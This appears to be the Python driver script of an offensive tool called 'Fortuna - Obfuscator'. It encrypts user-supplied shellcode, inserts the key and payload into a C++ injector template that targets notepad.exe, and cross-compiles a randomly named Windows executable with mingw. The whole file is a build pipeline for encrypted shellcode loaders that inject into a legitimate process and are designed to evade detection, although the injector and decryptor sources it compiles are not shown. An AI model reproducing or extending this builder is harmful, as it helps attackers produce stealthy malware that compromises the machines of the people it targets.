import shutil
import pyfiglet
import os
from colorama import Fore
import randomname
from os import listdir
from os.path import isfile, join


def move_existing_shell():
    path = input("Insert shell's full path.\n")
    exists = os.path.isfile(path)
    if not exists:
        print(Fore.RED + "[---] Error occurred trying to find the shell in directory, Verify provided path.")
        move_existing_shell()
    else:
        try:
            shutil.copy(path, os.getcwd() + "/shell.bin")
            print(Fore.GREEN + "[---] ShellCode was successfully copied!")

        # If there is any permission issue
        except PermissionError:
            print(Fore.RED + "[---] Error occurred Permission Denied, exiting.")
            exit(0)

        # For other errors
        except:
            print(Fore.RED + "[---] Error occurred while copying file, exiting.")
            exit(0)


def encryptionSelect():
    encryptorsPath = os.getcwd() + "/Encryptors"
    encryptionMethod = [os.path.splitext(f)[0] for f in listdir(encryptorsPath) if isfile(join(encryptorsPath, f)) and not (f.startswith(".") or f.endswith(".h"))]
    print(Fore.WHITE + "[---] Choose injection method desired:")
    for idx, encryptor in enumerate(encryptionMethod):
        print(Fore.WHITE + "  [---] " + str(idx) + ". " + encryptor + " Method")

    encryptorSelected = encryptionMethod[int(input())]

    print(Fore.WHITE + "[---] Encrypting Shellcode with " + encryptorSelected + " Encryption")
    os.system("python3 Encryptors/" + encryptorSelected + ".py" " shell.bin")
    exists = os.path.isfile("keys.txt")
    if not exists:
        print(Fore.RED + "[---] Error occurred trying to encrypt shellcode")
        exit(0)
    print(Fore.GREEN + "[---] Encrypted Successfully!")
    return encryptorSelected


def InjectionMethodSelection():
    injectiorsPath = os.getcwd() + "/Injectors/InjectionMethods"
    injectionMethods = [os.path.splitext(f)[0] for f in listdir(injectiorsPath) if isfile(join(injectiorsPath, f)) and not (f.startswith(".") or f.endswith(".h"))]
    print(Fore.WHITE + "[---] Choose injection method desired:")
    for idx, injector in enumerate(injectionMethods):
        print(Fore.WHITE + "  [---] " + str(idx) + ". " + injector + " Method")
    return injectionMethods[int(input())]


def BuildEXE(injectionMethod, encryptionMethod):
    print(Fore.WHITE + "[---] Building executable using " + injectionMethod + "Method")
    name = randomname.generate('v/programming') + randomname.generate('v/military_navy') + randomname.generate('v/manipulation')
    if os.system('x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ Injectors/ModifiedCPP.cpp Injectors/InjectionMethods/' + injectionMethod + '.cpp Injectors/Injector.cpp Injectors/Decryptors/' + encryptionMethod + 'Decryptor.cpp -o EXEs/' + name) != 0:
        print(Fore.RED + "[---] An Error occurred while trying to compile!")
        exit(0)

    #os.remove('Injectors/ModifiedCPP.cpp')
    print(Fore.GREEN + "[---] SUCCESS!!!")
    print(Fore.GREEN + "[---] ENCRYPTED! INJECTED! COMPILED!")
    print(Fore.GREEN + "[---]" + name + ".exe has been created!")


def BuildCPP(injectionMethod, encryptionMethod):
    with open("keys.txt", "r") as keys_file:
        converted_key = keys_file.readline()
        encrypted_payload = keys_file.readline()

    with open("Injectors/InjectorCreator.cpp", "r") as injector_creator:
        injector_file = injector_creator.read().replace("DESIRED_INJECTOR", injectionMethod).replace("DESIRED_ENCRYPTOR", encryptionMethod).replace("INSERTKEYHERE", converted_key).replace("INSERTPAYLOADHERE", encrypted_payload).replace("INSERTDESIREDNAME", "notepad.exe")

    with open("Injectors/ModifiedCPP.cpp", "w") as output:
        output.write(injector_file)

    BuildEXE(injectionMethod, encryptionMethod)



def main():
    # Print title using pyfiglet lib - ASCII ART.
    result = pyfiglet.figlet_format("Fortuna - Obfuscator", font="roman", width = 1200)
    print(result)

    # Main menu.
    print(Fore.WHITE + "[---] Choose an option below:")
    print(Fore.WHITE + "  [---] 1. Insert own shell.")
    choose = input()
    if choose != '1':
        print(Fore.RED + "[---] Wrong choice, Exiting!")
        exit(3)
    move_existing_shell()
    encryptionSelected = encryptionSelect()
    injectionMethod = InjectionMethodSelection()
    BuildCPP(injectionMethod, encryptionSelected)

if __name__ == "__main__":
    main()
